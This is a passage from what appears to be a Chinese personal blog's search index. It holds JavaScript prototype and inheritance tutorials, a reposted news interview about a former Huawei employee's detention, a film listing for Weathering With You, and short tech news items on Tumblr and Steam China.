class="line">writer.constructor&#x3D;&#x3D;&#x3D;Person&#x2F;&#x2F;true</span><br></pre></td></tr></table></figure><p>因为Writer的原型的构造器是Person,但是缺少这句并不影响继承</p><p>之所以不影响继承是因为实例writer继承的方法和属性有：</p><ul><li><strong>构造器原型的方法、属性</strong></li><li><p><strong>原型链上的方法、属性</strong></p><p>虽然实例writer的构造器是 Person,Person没有Writer添加的原型方法、属性，但是writer的原型链指向Writer的原型</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">writer.__proto__&#x3D;&#x3D;&#x3D;Writer.prototype&#x2F;&#x2F;true</span><br></pre></td></tr></table></figure><p>所以writer就有了introduce方法和init属性</p><h2 id="3、写在后面"><a href="#3、写在后面" class="headerlink" title="3、写在后面"></a>3、写在后面</h2><pre><code>纯属个人理解，有问题请不要留情</code></pre>]]></content>
      
      
      <categories>
          
          <category> 工作学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS 原型、原型链、构造器关系</title>
      <link href="JS-%E5%8E%9F%E5%9E%8B%E3%80%81%E5%8E%9F%E5%9E%8B%E9%93%BE%E3%80%81%E6%9E%84%E9%80%A0%E5%99%A8%E5%85%B3%E7%B3%BB.html"/>
      <url>JS-%E5%8E%9F%E5%9E%8B%E3%80%81%E5%8E%9F%E5%9E%8B%E9%93%BE%E3%80%81%E6%9E%84%E9%80%A0%E5%99%A8%E5%85%B3%E7%B3%BB.html</url>
      
        <content type="html"><![CDATA[<h1 id="js-原型、原型链、构造器关系"><a href="#js-原型、原型链、构造器关系" class="headerlink" title="js 原型、原型链、构造器关系"></a>js 原型、原型链、构造器关系</h1><p>写在前面</p><ul><li>已实例化的对象只有__proto__属性</li><li>未实例化的对象有prototype和__proto__属性</li><li>构造器是prototype对象的一个属性</li></ul><p>上图 <br> <img alt="这里写图片描述" title data-src="https://img-blog.csdn.net/20170801164359406?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvd2VpeGluXzM4MjgzMTU5/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" class="lazyload"> <br>测试走起</p><h2 id="1-普通函数"><a href="#1-普通函数" class="headerlink" title="1.普通函数"></a>1.普通函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function A(x)&#123;</span><br><span class="line">    this.x&#x3D;x;</span><br><span class="line">&#125;</span><br><span class="line">console.log(A.prototype.constructor)&#x2F;&#x2F;function A()</span><br><span class="line">console.log(A.prototype.__proto__&#x3D;&#x3D;&#x3D;Object.prototype)&#x2F;&#x2F;true</span><br><span class="line">console.log(A.__proto__&#x3D;&#x3D;&#x3D;Function.prototype)&#x2F;&#x2F;true</span><br></pre></td></tr></table></figure><ul><li>函数原型(prototype)的构造器(constructor)指向构造函数自身</li><li>函数原型的原型链(__proto__)指向Object的原型(prototype)</li><li>函数对象的原型链指向Function(所有函数对象的爸爸)的原型</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function A(x)&#123;</span><br><span class="line">    this.x&#x3D;x;</span><br><span class="line">&#125;</span><br><span class="line">var A1&#x3D;new A(1);</span><br><span class="line">console.log(A1.__proto__&#x3D;&#x3D;&#x3D;A.prototype)&#x2F;&#x2F;true</span><br><span class="line">console.log(A1.__proto__.constructor)&#x2F;&#x2F;function A()</span><br><span class="line">console.log(A1.constructor)&#x2F;&#x2F;function A()</span><br></pre></td></tr></table></figure><ul><li>函数实例的原型链(__proto__)指向其构造函数的原型(prototype)</li><li><p>函数实例的构造器就是其构造函数</p></li></ul><h2 id="2-对象函数"><a href="#2-对象函数" class="headerlink" title="2.对象函数"></a>2.对象函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">console.log(Object.prototype.constructor)&#x2F;&#x2F;function Object()</span><br><span class="line">console.log(Object.__proto__&#x3D;&#x3D;&#x3D;Function.prototype)&#x2F;&#x2F;true</span><br></pre></td></tr></table></figure><ul><li>对象函数原型(prototype)的构造器(constructor)指向对象构造函数自身</li><li>当然Function也是Object他爸</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var obj&#x3D;new Object();</span><br><span class="line">obj&#x3D;&#123;</span><br><span class="line">    a:&#39;a&#39;,</span><br><span class="line">    b:&#39;b&#39;</span><br><span class="line">&#125;</span><br><span class="line">console.log(obj.__proto__&#x3D;&#x3D;&#x3D;Object.prototype)&#x2F;&#x2F;true</span><br><span class="line">console.log(obj.__proto__.constructor)&#x2F;&#x2F;function Object()</span><br><span class="line">console.log(obj.constructor)&#x2F;&#x2F;function Object()</span><br></pre></td></tr></table></figure><ul><li>对象的原型链(__proto__)指向对象函数的原型(prototype)</li><li><p>对象的构造器(constructor)是对象函数</p></li></ul><h2 id="3-Function函数"><a href="#3-Function函数" class="headerlink" title="3.Function函数"></a>3.Function函数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">console.log(Function.prototype.constructor)&#x2F;&#x2F;function Function() </span><br><span class="line">console.log(Function.__proto__&#x3D;&#x3D;&#x3D;Function.prototype)&#x2F;&#x2F;true</span><br><span class="line">console.log(Function.prototype.__proto__&#x3D;&#x3D;&#x3D;Object.prototype)&#x2F;&#x2F;true</span><br></pre></td></tr></table></figure><ul><li>Function的构造器(constructor)指向Function</li><li>Function的原型链(__proto__)指向Function的原型(prototype)</li><li><p>Function原型的原型链(__proto__)指向Object的原型(prototype)</p><h2 id="4-归于虚无"><a href="#4-归于虚无" class="headerlink" title="4.归于虚无"></a>4.归于虚无</h2></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">console.log(Object.prototype.__proto__&#x3D;&#x3D;&#x3D;null)&#x2F;&#x2F;true</span><br></pre></td></tr></table></figure><ul><li>Object原型(prototype)的原型链(__proto__)指向null</li></ul>                                    ]]></content>
      
      
      <categories>
          
          <category> 工作学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JS面向对象编程之：封装、继承、多态</title>
      <link href="JS-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1.html"/>
      <url>JS-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1.html</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><!--页面头部添加--><h1 id="JS面向对象编程之：封装、继承、多态"><a href="#JS面向对象编程之：封装、继承、多态" class="headerlink" title="JS面向对象编程之：封装、继承、多态"></a>JS面向对象编程之：封装、继承、多态</h1><p>&nbsp;最近在实习公司写代码，被隔壁的哥们吐槽说，代码写的没有一点艺术。为了让我的代码多点艺术，我就重新温故了《javascript高级程序设计》（其中几章），然后又看了《javascript设计模式》，然后觉得要写点心得体会，来整理自己所学的吧。以下是我个人见解，错了请轻喷，欢迎指出错误，乐于改正。</p><p><img alt width="474" height="262" data-src="https://images2015.cnblogs.com/blog/816397/201607/816397-20160731220533138-1790206129.png" class="lazyload"></p><p>&nbsp;</p><p>&nbsp; &nbsp; &nbsp;&nbsp;一、封装</p><p>&nbsp; &nbsp; &nbsp; （1）封装通俗的说，就是我有一些秘密不想让人知道，就通过私有化变量和私有化方法，这样外界就访问不到了。然后如果你有一些很想让大家知道的东西，你就可以通过this创建的属性看作是对象共有属性和对象共有方法，这样别人知道你的公共的东西啦，不止如此，你还可以访问到类或对象自身的私有属性和私有方法。哇，这种权利好大呀，外面的公共的方法和属性，和内部的私有属性和方法都可以访问到，都有特权啦，因此就叫做特权方法了。看个例子就知道啦。</p><p><img alt data-src="https://images2015.cnblogs.com/blog/816397/201607/816397-20160731221941169-1981451310.png" class="lazyload"></p><p>类的内部this上定义的属性和方法自然就可以复制到新创建的对象上，成为对象公有化的属性和方法，又可以访问私有属性和私有方法，因此就叫特权方法。</p><p>这样调用就可以啦</p><p><img alt data-src="https://images2015.cnblogs.com/blog/816397/201607/816397-20160731222522778-478754452.png" class="lazyload"></p><p>&nbsp; &nbsp;&nbsp;&nbsp; （2）闭包实现的封装</p><p>　　闭包是有权访问另外一个函数作用域中变量的函数，即在一个函数内部创建另外一个函数。这时就可以将闭包作为创建对象的构造函数，这样它既是闭包又是可实例对象的函数。</p><p><img alt data-src="https://images2015.cnblogs.com/blog/816397/201607/816397-20160731230614356-1409630772.png" class="lazyload"></p><p>&nbsp; &nbsp; &nbsp; &nbsp;二、继承</p><p>　　（1）类</p><p>　　&nbsp;每个类有3个部分：1,是构造函数内的，是供实例化对象复制用的。2,是构造函数外的，直接通过点语法添加的，这是供类使用的，实例化对象是访问不到的。3,是类的原型中的，实例化对象可以通过其原型链简介地访问到，也是为供所有实例化对象所共有的。</p><p>&nbsp; &nbsp; &nbsp;（2）类式继承</p><p>&nbsp; &nbsp; &nbsp;通过子类的原型prototype对象实例化来实现的</p><p>　　<img alt data-src="https://images2015.cnblogs.com/blog/816397/201607/816397-20160731231414903-1734538422.png" class="lazyload"></p><p>继承就是声明2个类，不过类式继承需要将第一个类的实例赋值给第二个类的原型。这段代码，在实现subClass继承superClass时是通过将superClass的实例赋值给subClass的原型prototype,所以subClass.prototype继承了superClass.</p><p><strong>缺点</strong>就是：一个子类的实例原型从父类构造函数中继承来的共有属性就会直接影响到其他子类。比如：</p><p><img alt data-src="https://images2015.cnblogs.com/blog/816397/201607/816397-20160731232427403-1713790397.png" class="lazyload"></p><p><strong>额外知识点</strong>：instanceof是通过对象的prototype链来确定这个对象是否是某个类的实例，而不关心对象与类的自身结构。</p><p>&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;（3）构造函数式继承</p><p>&nbsp; &nbsp; &nbsp; &nbsp;构造函数式继承是通过在子类的构造函数作用环境中执行一次父类的构造函数来实现的。</p><p>　　 &nbsp;&nbsp;<img alt data-src="https://images2015.cnblogs.com/blog/816397/201607/816397-20160731233137638-668815399.png" class="lazyload"></p><p>SuperClass.call(this,id);是构造函数式继承的精华，call可以更改函数的作用环境。这个对SuperClass调用这个方法就是将子类中的变量子啊父类中执行一遍，由于父类中是给this绑定属性的，因此子类自然也就继承了父类的共有属性。由于这种类型的继承没有涉及原型prototype,所以父类的原型方法自然不会被子类继承，而如果要想被子类继承就必须要放在构造函数中。</p><p>　　（4）组合继承</p><p>&nbsp; &nbsp; 组合继承就是：类式继承+构造函数继承</p><p><img alt data-src="https://images2015.cnblogs.com/blog/816397/201607/816397-20160731234213216-1128265252.png" class="lazyload"></p><p>这里用例子来测试下</p><p><img alt data-src="https://images2015.cnblogs.com/blog/816397/201607/816397-20160731234539106-488093682.png" class="lazyload"></p><p>&nbsp;果然子类的实例中更改父类继承下来的引用类型属性如books,根本不会影响到其他实例，并且子类实例化过程中又能将参数传递到父类的构造函数中。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; （5）原型式继承</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;原型式继承跟类式继承一样，父类对象book中的值类型的属性被复制，引用类型的属性被共有。</p><p>&nbsp;<img alt data-src="https://images2015.cnblogs.com/blog/816397/201608/816397-20160802101645668-406639973.png" class="lazyload"></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; （6）寄生式继承</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 通过在一个函数内的过渡对象实现继承并返回新对象的方式，称之为寄生式继承。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;寄生就像寄生虫一样寄托于某个对象内部生长。就是对原型继承的第二次封装，并且在这第二次封装过程中对继承的对象进行了扩展，这样新创建的对象不仅仅有父类中的属性和方法而且还添加了新的属性和方法。</p><p>看下下面的例子吧</p><p><img alt data-src="https://images2015.cnblogs.com/blog/816397/201608/816397-20160802102508778-920595923.png" class="lazyload"></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;（7）寄生组合式继承</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 寄生组合式继承就是寄生式继承+构造函数式继承，</p><p><img alt data-src="https://images2015.cnblogs.com/blog/816397/201608/816397-20160802105736122-504725171.png" class="lazyload"></p><p>先创建了父类，还有父类的原型方法，然后创建子类，并在构造函数中实现构造函数式继承，然后又通过寄生式继承了父类 原型，最后又对子类添加了一些原型方法。</p><p>现在我们来测试一下</p><p><img alt data-src="https://images2015.cnblogs.com/blog/816397/201608/816397-20160802110120465-1702254787.png" class="lazyload"></p><p>显然不会出现子类调用之后，另一个子类的值被改变。在这里其中最大的改变是对子类原型的处理，被赋予父类原型的一个引用，这是一个对象。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;（8）多继承</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<img alt data-src="https://images2015.cnblogs.com/blog/816397/201608/816397-20160802112718090-303191191.png" class="lazyload"></p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 通过这种方式对一个对象属性的复制继承，将多个父类(对象)的属性与方法拷贝给子类实现继承</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;三、多态</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; 多态就是通过对传递的参数判断来执行逻辑，即可实现一种多态处理机制</p><p>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;下面就是这个例子，通过多态类，调用add运算方式，根据不同参数做运算</p><p><img alt data-src="https://images2015.cnblogs.com/blog/816397/201608/816397-20160802113538512-1706925925.png" class="lazyload"></p><p>&nbsp;</p><p>这就是面向对象的三种特性啦，封装、继承、多态，对原理的理解，能在看其他人的优秀代码的时候，有个很好的理解。</p>]]></content>
      
      
      <categories>
          
          <category> 工作学习 </category>
          
          <category> 面向对象 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
            <tag> 面向对象 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>华为离职事件</title>
      <link href="Huawei%20resignation.html"/>
      <url>Huawei%20resignation.html</url>
      
        <content type="html"><![CDATA[<h1 id="华为被拘前员工谈离职：因部门业务造假"><a href="#华为被拘前员工谈离职：因部门业务造假" class="headerlink" title="华为被拘前员工谈离职：因部门业务造假"></a>华为被拘前员工谈离职：因部门业务造假</h1><p>　　一笔30万元的离职赔偿款反成“敲诈勒索金”，华为前员工李洪元遭到251天拘留一事正在持续发酵。</p><p>　　11月28日，有自媒体曝光了一份《刑事赔偿决定书》，将华为与一位前员工的陈年纠葛展现在了公众面前。</p><p>　　李洪元于2005年入职华为，2018年1月离职。因离职补偿金额与公司意见不一，双方经商谈同意给李洪元补发331576.73元离职补偿。</p><p>　　2018年3月，李洪元过去所在部门的秘书，通过私人账户向其转款304742.98元（税后金额，交易摘要为“离职金额补偿”）。</p><p>　　但在2018年12月16日，李洪元却因涉嫌敲诈勒索罪被深圳市公安局刑事拘留，并于2019年1月22日被逮捕。但最终因“犯罪事实不清、证据不足”，于2019年8月23日被释放，总共被羁押了251天。</p><p>　　此事一经曝光，便收获了外界无数的关注。大家怀疑李洪元是否因为要求离职补偿而被当初所在部门恶意构陷。</p><p>　　11月30日，李洪元在华为心声社区上发了一个帖子，名为《给任总的一封公开信》。其中写道：“今天网络上的舆情汹汹并不是我本意，我的确会向公司讨要说法，但绝不期望是以这种方式。”</p><p>　　12月1日下午，界面新闻采访了这位遭到拘留的当事人李洪元。他向界面新闻还原了他从华为离职当天到成为舆论中心的全过程。</p><p>　　截至发稿前，华为官方对此事暂无回应。</p><p>　　<strong>以下是采访内容：</strong></p><p>　　<strong>界面新闻：这件事是你自己主动曝光的吗？为什么8月被释放，现在才被曝光？</strong></p><p>　　李洪元：不是我主动曝光。我8月被释放，但拿到国家赔偿是在上周三。网上被曝光的是《刑事赔偿决定书》，那是上周才有的文件。</p><p>　　拿到赔偿后，我挺开心的，就把这份决定书分享到了华为离职员工维权群里，期望有人能帮忙发到华为心声内网，以恢复名誉。结果不知道是谁发到外面去了，我自己也非常着急。</p><p>　　<strong>界面新闻：能不能简要概括一下你在华为的经历？</strong></p><p>　　李洪元：2005年10月，我从浙江巨化集团离职，加入华为杭州，担任企业安全与存储产品线的研发，后来被调去呼和浩特和印度新德里做过市场和销售，还在网络能源产品线下面的营销工程部做过秘书。</p><p>　　我在华为的最后一个部门是太阳能逆变器业务部，这个部门的是相对公司主流程独立运营的。我带领一个八九人的小团队，负责业务流程梳理。</p><p>　　我刚入职华为的时候是15级，月薪9000，比我当时2000块的月薪高很多，所以我来了。这十二年来我的收入成倍增长(公司没有亏待我，也是我举报的动力)，但职级一直没变过。</p><p>　　从2008年开始，我成为了华为的持股员工，有一点点股份，能拿到一点点分红。2018年1月，我从华为离职。</p><p>　　<strong>界面新闻：你为什么从华为离职？</strong></p><p>　　李洪元：<strong>我当时所在的逆变器业务，是一个通过政府补贴而存在的行业。销售毛利低，想要赚钱只能把规模做大。部门业务造假很早就开始了，公司大量资金被占用、仓储、存货方面都承担着巨额损失。出于我对华为的感情来说，我觉得我必须要把这股歪风给遏制住，所以我就在2016年11月举报了。</strong></p><p>　　举报之后我就明显感觉到主管开始针对我，比如他不批我的出差，又比如我手下的人离职，我要补人，但他也不允许把我看中的人调进来。</p><p>　　这时候接近2017年年底，到了我续签合同的时候了（华为员工合同四年一签），我还是想留在华为的，但主管就直接和我说，公司不和我续签了。</p><p>　　我尊重公司的选择，但是因为我入职12年了，按劳动法的规定，入职10年以上是可以签无固定期限劳动合同的，公司应遵从劳动法给予赔偿。</p><p>　　<strong>界面新闻：赔偿具体是怎么谈的？</strong></p><p>　　李洪元：是在2018年1月31号，网络能源产品线的HR的何某来跟我谈，给出的方案是N+1（含<a href="http://money.163.com/baike/nianzhongjiang/" target="_blank" title="财经事件_年终奖">年终奖</a>），我不认同这个方案，提出了2N，最后他们很爽快的答应了，双方签署了离职协议。</p><p>　　谈判过程长达两个小时，中途有说有笑，我没有任何敲诈勒索的言辞，也没有提到之前举报的事情。</p><p>　　<strong>界面新闻：最终你收到了多少赔偿？</strong></p><p>　　李洪元：2018年3月8日，我来深圳签了确认书，当天下午收到由何某秘书周某私人账户转来的大概30万元。</p><p>　　我疑惑过，为什么是私人账户，还曾打电话给60169（华为HR热线）询问原因，但对方说这是我们部门的事情，不归他们管。后来，我还向税务部门反映过这笔款项没交税的问题，税务部门通知公司补缴税款。</p><p>　　<strong>界面新闻：私人账户转账是否合理？目的是什么？</strong></p><p>　　李洪元：我不清楚，但我知道不下5位华为同事的离职赔偿都是通过这种方式得到的，我认为这是华为一种变通的处理方法。</p><p>　　<strong>界面新闻：这个赔偿与你们之前协商的数字符合吗？</strong></p><p>　　李洪元：相符。但当时答应我的年终奖没给，所以我在11月7日那天起诉了华为，我想拿回我的年终奖，总共20余万。</p><p>　　对于这件事，华为向法院拿出的一份1月22日的部门考评会议纪要，纪要上说我的绩效不好。华为称，这是不给我年终奖的原因。但这份会议纪要有诸多疑点。</p><p>　　<strong>界面新闻：你因为年终奖这件事起诉华为，是你被抓的导火索吗？</strong></p><p>　　李洪元：不清楚，但我在12月16号这天被抓了。</p><p>　　<strong>界面新闻：你等待起诉结果的这段时间，做了什么？</strong></p><p>　　李洪元：一直在看守所里，什么也做不了。</p><p>　　<strong>界面新闻：谈谈你被抓的过程吧。</strong></p><p>　　李洪元：被抓的时候我还在睡梦当中，家里被搜查了。警察告诉我，华为报了案，抓我的原因是我涉嫌职务侵占。但我到了派出所以后，我的罪名就变成了泄露商业机密。</p><p>　　<strong>界面新闻：你有过泄露商业机密的行为吗？</strong></p><p>　　李洪元：我认为我没有。</p><p>　　华为向警察出示的证据是，我曾经把华为系统内部的文件拷贝出去了，还说我打印了一些内部资料。我确实有把华为文件拷贝出去的行为，但我拷贝的都是给客户看的宣传资料，没有密级的，而且是得到了领导同意的。至于打印的资料，有成百份了，但都是工作需要。</p><p>　　<strong>界面新闻：你在之前的采访当中说，你妻子在4月份的时候提交了你和HR的录音，为什么直到这个时间点才交？</strong></p><p>　　李洪元：4月16日，检察官第一次来找我，我才得知华为的HR何某说我敲诈勒索30万，这是我被抓的原因。第二天我见到我的律师，让她转告我的妻子去找录音，并在4月把录音交给了检察机关。</p><p>　　<strong>界面新闻：4月就提交了证据，为什么8月你才被释放？</strong></p><p>　　李洪元：不清楚。其实在7月份的时候，何某就已经改口供了，他说我没有敲诈勒索。</p><p>　　<strong>界面新闻：从开始拘留到现在，你和华为有沟通吗？</strong></p><p>　　李洪元：没有任何沟通，我和我家人没去找过华为，华为现在也没来找过我。</p><p>　　<strong>界面新闻：被关押的251天你经历了什么？</strong></p><p>　　李洪元：思考今后的人生，与律师一起想办法。我母亲一个礼拜之内瘦了6斤，我爷爷在这期间去世了，我觉得这件事情对他也有刺激吧，没能见他最后一面很遗憾。</p><p>　　<strong>界面新闻：有人质疑你当初的举报动机不单纯。</strong></p><p>　　李洪元：社会的运行规律是主观为自己，客观为别人。通过为别人提供价值来实现自己的价值。举报这个事情本身对公司是有积极作用的，甚至某些时候还设置了奖励和对当事人的保护措施。因此想通过举报获得一个和高层对话的机会，并不违反道德和法律。</p><p>　　<strong>界面新闻：你现在还有什么诉求？</strong></p><p>　　李洪元：我还是希望和华为沟通，最好是任总能够亲自来和我沟通，就占用他老人家30分钟时间吧。毕竟之前与何总的沟通结果，一句不代表公司行为就作废了，我搞怕了。</p><p>　　<strong>界面新闻：有什么之后的打算？</strong></p><p>　　李洪元：正在准备创业，为以后我们国家能少发生这类事尽一点薄力。</p><p>　　稿源：界面新闻</p><p>　　<strong>后续：华为回应：支持李洪元运用法律武器维护自己的权益</strong></p><p>　　华为前员工李洪元离职后被起诉敲诈勒索，羁押251天后，因犯罪事实不清、证据不足释放。近日，李洪元接受多家媒体采访并表达了个人诉求。</p><p>　　对此，华为今天作出回应：华为有权利，也有义务，并基于事实对于涉嫌违法的行为向司法机关举报。我们尊重司法机关，包括公安、检察院和法院的决定。如果李洪元认为他的权益受到了损害，我们支持他运用法律武器维护自己的权益，包括起诉华为。这也体现了法律面前人人平等的法治精神。</p>]]></content>
      
      
      <categories>
          
          <category> 情感生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HUAWEI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>天气之子</title>
      <link href="windson.html"/>
      <url>windson.html</url>
      
        <content type="html"><![CDATA[<img alt="天气之子" data-src=" /img/windSon.jpg" class="lazyload"><h1>        <span property="v:itemreviewed">天气之子 天気の子</span>            <span class="year">(2019)</span></h1><p>导演: 新海诚<br>编剧: 新海诚<br>主演: 醍醐虎汰朗 / 森七菜 / 小栗旬 / 本田翼 / 倍赏千惠子 / 更多…<br>类型: 爱情 / 动画 / 奇幻<br>官方网站: <a href="http://www.tenkinoko.com">www.tenkinoko.com</a><br>制片国家/地区: 日本<br>语言: 日语<br>上映日期: 2019-11-01(中国大陆) / 2019-07-19(日本)<br>片长: 111分钟 / 113分钟(中国大陆)<br>又名: Weathering With You / Weather Child / Weather’s Child / Child of Weather  </p><div style="pull-left">豆瓣评分  7.1  136604人评价5星 14.0% 4星 36.2% 3星 40.5% 2星 8.1% 1星 1.2% 好于 38% 动画片好于 52% 爱情片  我看过这部电影 2019-11-15    我的评价:           力荐 标签:奇幻 2019 动漫 爱情 动画 青春 治愈 日本 動漫 神作   神作 !!! 全程泪点不断~ 浪漫虚幻风爱情电影   写短评   写影评 添加到豆列 分享到   推荐  天气之子的剧情简介 · · · · · ·  </div><br><br><div style="pull-right"><img height="800" width="600" data-src="/img/wind2.jpg" class="lazyload"></div>  <br><br>　　高一那年夏天，帆高（醍醐虎汰朗配音）离开位在离岛的家乡，独自一人来到东京，拮据的生活迫使他不得不找份工作，最后来到一间专门出版奇怪超自然刊物的出版社担任写手。不久，东京开始下起连日大雨，仿佛暗示着帆高不顺遂的未来，在这座繁忙城市里到处取材的帆高邂逅了与弟弟相依为命，不可思议的美少女阳菜（森七菜配音）。「等等就会放晴了喔。」阳菜这样告诉着帆高，不久，头顶的乌云逐渐散去，耀眼的阳光洒落街道……原来，阳菜拥有「改变天气」的奇妙能力……天气之子的演职员 · · · · · ·  <p>新海诚        森七菜               小栗旬              本田翼                  倍赏千惠子<br>导演         配 天野阳菜            配音                配音                     配音  </p>]]></content>
      
      
      <categories>
          
          <category> 情感生活 </category>
          
          <category> 电影 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 天气之子 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pornhub考虑收购Tumblr</title>
      <link href="pornhub.html"/>
      <url>pornhub.html</url>
      
        <content type="html"><![CDATA[<div class="entry clearfix">        <h1>Pornhub考虑收购Tumblr</h1>                <img alt="微博客" class="thumb lazyload" data-src="https://www.williamlong.info/logo/Microblog.gif">        <p>　　威瑞森电信（Verizon Communications）正在为轻博客社交网络平台Tumblr寻找买家，该公司正试图稳定难以实现收入目标的媒体业务。威瑞森媒体公司的前身是AOL和网络事业部门所属的母公司Oath。</p><p>　　Tumblr是一项拥有4亿多博客的免费服务，2013年，雅虎斥资约11亿美元收购了这家总部位于纽约的网站，当时它与图片社交网站Pinterest和新闻聚合网站Reddit等知名公司一样，是众多快速成长的初创公司之一。但Tumblr难以为雅虎创造有意义的收入，并被其他社交媒体，如Medium、和Instagram所超越。</p><p>　　《华尔街日报》报道说，最近几周，Verizon已经接触其它公司，它们可能想收购Tumblr。Tumblr目前有4.654亿篇博文和1720篇贴子。</p><p>　　Pornhub副总裁Carey Price在声明中说，他的公司很有兴趣买下Tumblr，非常期待能以NSFW内容（不适合上班时间浏览的内容）让平台恢复以前的光荣。</p><p>　　Tumblr从去年开始大力整治色情内容问题，造成流量下降，用户流失，Pornhub对此表示惋惜，并希望未来可以重现Tumblr的辉煌。</p><p>　　稿源：英国《每日邮报》</p></div>]]></content>
      
      
      <categories>
          
          <category> 吹牛逼 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pornhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Steam中国正式定名“蒸汽平台”</title>
      <link href="Steam.html"/>
      <url>Steam.html</url>
      
        <content type="html"><![CDATA[<div class="entry clearfix">        <h1>Steam中国正式定名“蒸汽平台”</h1>          <p>　　8月21日，Steam中国终于正式定名，新名叫做：“蒸汽平台”。Steam中国（蒸汽平台）几乎完全独立于Steam，游戏库也将不断扩充，含VR游戏。首批上线的有包含《Dota2》《刀塔霸业》在内的近40款游戏。官方称，完美世界与美国Valve将在STEAM中国项目上密切合作。Steam全球其他已有的运营与服务不受影响。</p><p>　　完美中国表示，蒸汽平台专门为中国玩家打造，提供了高速服务器，高质量本地化等服务，同时也支持VR技术，并将逐渐构建海量精品游戏库。能满足不同口味玩家的需求。</p><p>　　本次发布会试玩环节，包括日本游戏厂商光荣特库摩的《三国志 14》、网易的《战意：前线》世嘉的《双点医院》等热门作品纷纷亮相，而诸如《欧洲卡车模拟 2》、《胡闹厨房 2》、《重生细胞》、《深海迷航》、《Raft》、《非常英雄》等众多独立作品也带来了不错的反响，让玩家对于平台正式推出时的作品充满期待。</p><p>　　除了大作和独立作品，蒸汽平台还将把更多 VR 内容带给国内玩家，这一点对于国内 VR 行业来说也是好事，一方面可以满足不同年龄和品味玩家的需求，另一方面对于内容创意者来说会是一个新的机会。</p><p style="text-align:center"><img alt="steam" data-src="/img/steam.jpg" class="lazyload"></p><p>　　国内目前 PC 玩家人数超过 3 亿人，根据 Niko Partners 的预测，到 2023 年 PC 玩家将超过 3.54 亿人，在 Steam 上，中国在全球数据流量占比达到 17.8%，超过美国 16.1% 成为世界第一，从数据上看，庞大的玩家群体需要更精细化的运营。</p><p>　　据介绍，蒸汽平台是Steam官方专门为中国玩家打造的，不仅提供了高速服务器，高质量本地化等服务，同时也将支持VR技术，并将逐渐构建海量精品游戏库，能最大化的满足不同玩家的各方面需求。</p><p>　　另外，早在去年完美世界Steam中国就已在上海浦东落户，形成产业集群，推动中国游戏和海外市场的交流。Steam平台是全球最大的综合性数字发行平台之一，其上游戏数量超过2万款。Steam平台将成为我国最大的电竞游戏聚合地，有利于中国电子竞技赛事版权的持续丰富。</p></div>]]></content>
      
      
      <categories>
          
          <category> 吹牛逼 </category>
          
          <category> 游戏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Steam </tag>
            
            <tag> Game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Spring Boot【快速入门】</title>
      <link href="SpringBoot%E5%85%A5%E9%97%A8.html"/>
      <url>SpringBoot%E5%85%A5%E9%97%A8.html</url>
      
